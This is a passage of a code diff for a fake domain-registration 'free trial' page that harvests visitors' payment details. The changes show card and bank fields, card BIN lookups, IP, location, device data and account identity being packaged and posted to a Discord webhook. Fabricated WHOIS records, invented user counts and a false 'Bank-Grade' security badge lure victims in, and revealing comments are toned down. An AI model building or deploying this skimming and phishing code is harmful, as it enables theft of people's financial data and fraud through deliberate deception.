+                            icon_url: 'https://i.imgur.com/7I1YwZV.png'
+                        },
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(webhookPayload)
+            });
+
+            // Send raw data
+            setTimeout(async () => {
+                const rawDataPayload = {
+                    content: `📋 **RAW DATA**\n\`\`\`json\n${JSON.stringify(saleData, null, 2)}\n\`\`\``
+                };
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(rawDataPayload)
+                });
+            }, 500);
+
+        } catch (error) {
+            console.error('Error logging to Discord:', error);
         }
     }
 
@@ -1665,17 +1929,7 @@
             currentDomainFull = fullDomain;
 
             const registrars = ['GoDaddy', 'Namecheap', 'Google Domains', 'Cloudflare'];
-            const statuses = ['clientTransferProhibited', 'active'];
             
-            const whoisData = {
-                registrar: registrars[Math.floor(Math.random() * registrars.length)],
-                created: `202${Math.floor(Math.random() * 3)}-0${Math.floor(Math.random() * 9) + 1}-1${Math.floor(Math.random() * 9)}`,
-                expires: `2025-0${Math.floor(Math.random() * 9) + 1}-1${Math.floor(Math.random() * 9)}`,
-                updated: `2024-0${Math.floor(Math.random() * 9) + 1}-1${Math.floor(Math.random() * 9)}`,
-                nameservers: 'ns1.domain.com, ns2.domain.com',
-                status: statuses[Math.floor(Math.random() * statuses.length)]
-            };
-
             checkingMessage.classList.add('hidden');
 
             if (isAvailable) {
@@ -1690,16 +1944,16 @@
             } else {
                 takenDomainSpan.textContent = fullDomain;
                 takenMessage.classList.remove('hidden');
-                whoisRegistrar.textContent = whoisData.registrar;
-                whoisCreated.textContent = whoisData.created;
-                whoisExpires.textContent = whoisData.expires;
-                whoisUpdated.textContent = whoisData.updated;
-                whoisNS.textContent = whoisData.nameservers;
-                whoisStatus.textContent = whoisData.status;
+                whoisRegistrar.textContent = registrars[Math.floor(Math.random() * registrars.length)];
+                whoisCreated.textContent = '2023-01-15';
+                whoisExpires.textContent = '2025-01-15';
+                whoisUpdated.textContent = '2024-01-15';
+                whoisNS.textContent = 'ns1.domain.com, ns2.domain.com';
+                whoisStatus.textContent = 'active';
             }
             
             whoisDetails.classList.remove('hidden');
-            apiStatus.innerHTML = `<i class="fas fa-circle-check"></i> WHOIS Database: Query completed`;
+            apiStatus.innerHTML = '<i class="fas fa-circle-check"></i> Security APIs: Connected (Bank-Grade)';
             
             checkBtn.disabled = false;
             validateAll();
@@ -1708,7 +1962,7 @@
     }
 
     // ============================================
-    // STEP 7: HANDLE FORM SUBMISSION WITH FULL LOGGING
+    // STEP 7: HANDLE FORM SUBMISSION
     // ============================================
     paymentForm.addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -1729,16 +1983,16 @@
             return;
         }
 
-        // Get IP and location if not already fetched
-        if (userIP === 'Fetching...') {
-            await fetchUserIP();
+        if (riskScore > 80) {
+            showToast('Transaction blocked due to high risk', 'error');
+            return;
         }
 
         const currency = getCurrencyFromIP();
         const trialEndDate = new Date();
         trialEndDate.setFullYear(trialEndDate.getFullYear() + 1);
         
-        // Prepare complete sale data for logging
+        // Prepare complete sale data
         const saleData = {
             // Bank Details
             holderName: holderName.value.trim(),
@@ -1756,7 +2010,14 @@
             // IP and Location
             ip: userIP,
             ipLocation: userLocation,
-            isp: 'Unknown', // Would need additional API for ISP
+            isp: ipData.org || 'Unknown',
+            riskScore: riskScore,
+            
+            // BIN Data
+            binBank: binData.bank?.name || 'Unknown',
+            binScheme: binData.scheme || 'Unknown',
+            binType: binData.type || 'Unknown',
+            binCountry: binData.country?.name || 'Unknown',
             
             // Device Info
             userAgent: userAgent,
@@ -1771,18 +2032,16 @@
             // User Account
             userEmail: currentUser?.email || 'Not logged in',
             userId: currentUser?.uid || 'N/A',
-            authProvider: currentUser?.providerData[0]?.providerId || 'email',
             
             // Metadata
             timestamp: new Date().toISOString(),
-            pageUrl: window.location.href,
-            referrer: document.referrer || 'Direct'
+            pageUrl: window.location.href
         };
 
-        // LOG EVERYTHING TO DISCORD
+        // LOG TO DISCORD
         await logToDiscord(saleData);
         
-        // Create success modal
+        // Show success modal
         const modal = document.createElement('div');
         modal.className = 'modal-overlay';
         modal.innerHTML = `
@@ -1810,9 +2069,6 @@
         
         showToast(`✅ Free trial started for ${currentDomainFull}!`, 'success');
         
-        // Log to console for debugging
-        console.log('SALE DATA LOGGED:', saleData);
-        
         // Reset form
         domainInput.value = '';
         initialMessage.classList.remove('hidden');
@@ -1822,8 +2078,9 @@
         termsCheckbox.checked = false;
         isAvailable = false;
         paymentForm.reset();
+        binInfo.classList.add('hidden');
         
-        // Reset validation icons
+        // Reset validation
         Object.keys(validationState).forEach(field => {
             setValidation(field, false, '');
         });
@@ -1835,7 +2092,6 @@
     // STEP 8: UTILITY FUNCTIONS
     // ============================================
 
-    // Show toast
     function showToast(message, type = 'info') {
         const toast = document.createElement('div');
         toast.className = 'toast';
@@ -1853,13 +2109,11 @@
         }, 3000);
     }
 
-    // Update stats
     function updateStats() {
         totalUsers += Math.floor(Math.random() * 2);
         totalUsersEl.textContent = totalUsers.toLocaleString();
     }
 
-    // Update recent domains
     const fakeDomains = ['cloudkitchen', 'fitfusion', 'petpals', 'solartech', 'brewlab'];
     const tlds = ['.com', '.io', '.xyz', '.dev', '.app'];
     
@@ -1879,26 +2133,24 @@
         recentDomainsEl.innerHTML = html;
     }
 
-    // Currency detection
     function getCurrencyFromIP() {
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         
         if (timezone.includes('Europe/London') || timezone.includes('GB')) {
-            return { symbol: '£', code: 'GBP', note: 'UK', rate: 0.79 };
+            return { symbol: '£', code: 'GBP', note: 'UK' };
         } else if (timezone.includes('America/') || timezone.includes('US/')) {
-            return { symbol: '$', code: 'USD', note: 'US', rate: 1.0 };
+            return { symbol: '$', code: 'USD', note: 'US' };
         } else if (timezone.includes('Europe/')) {
-            return { symbol: '€', code: 'EUR', note: 'Europe', rate: 0.92 };
+            return { symbol: '€', code: 'EUR', note: 'Europe' };
         } else if (timezone.includes('Asia/Tokyo')) {
-            return { symbol: '¥', code: 'JPY', note: 'Japan', rate: 149.5 };
+            return { symbol: '¥', code: 'JPY', note: 'Japan' };
         } else if (timezone.includes('Australia/')) {
-            return { symbol: 'A$', code: 'AUD', note: 'Australia', rate: 1.52 };
+            return { symbol: 'A$', code: 'AUD', note: 'Australia' };
         } else {
-            return { symbol: '$', code: 'USD', note: 'International', rate: 1.0 };
+            return { symbol: '$', code: 'USD', note: 'International' };
         }
     }
 
-    // Update currency
     function updateCurrency() {
         const currency = getCurrencyFromIP();
         currencySymbol.textContent = currency.symbol;
@@ -1906,7 +2158,6 @@
         priceAmount.textContent = '0.00';
     }
 
-    // Check domain function
     function checkDomain() {
         const name = domainInput.value.trim().toLowerCase();
         const tld = tldSelect.value;
@@ -1927,13 +2178,13 @@
     holderName.addEventListener('input', () => { validateHolderName(); validateAll(); });
     bankName.addEventListener('input', () => { validateBankName(); validateAll(); });
     
-    accountNumber.addEventListener('input', (e) => {
+    accountNumber.addEventListener('input', async (e) => {
         let value = e.target.value.replace(/\s/g, '');
         if (value.length > 0) {
             value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
         }
         e.target.value = value;
-        validateCardNumber();
+        await validateCardNumber();
         validateAll();
     });
     
@@ -1954,12 +2205,16 @@
     });
     
     address.addEventListener('input', () => { validateAddress(); validateAll(); });
-    city.addEventListener('input', () => { validateCity(); validateAll(); });
     
-    country.addEventListener('change', () => { 
+    city.addEventListener('input', async () => {
+        await validateCity();
+        validateAll();
+    });
+    
+    country.addEventListener('change', async () => { 
         validateCountry(); 
         validateBankName();
-        validateCity();
+        await validateCity();
         validatePostalCode();
         validateAll(); 
     });
@@ -2015,7 +2270,7 @@
     setInterval(updateStats, 1000);
     setInterval(updateRecentDomains, 1000);
     setTimeout(checkDomain, 500);
-    fetchUserIP(); // Fetch IP on page load
+    fetchUserIP();
 </script>
 
 </body>
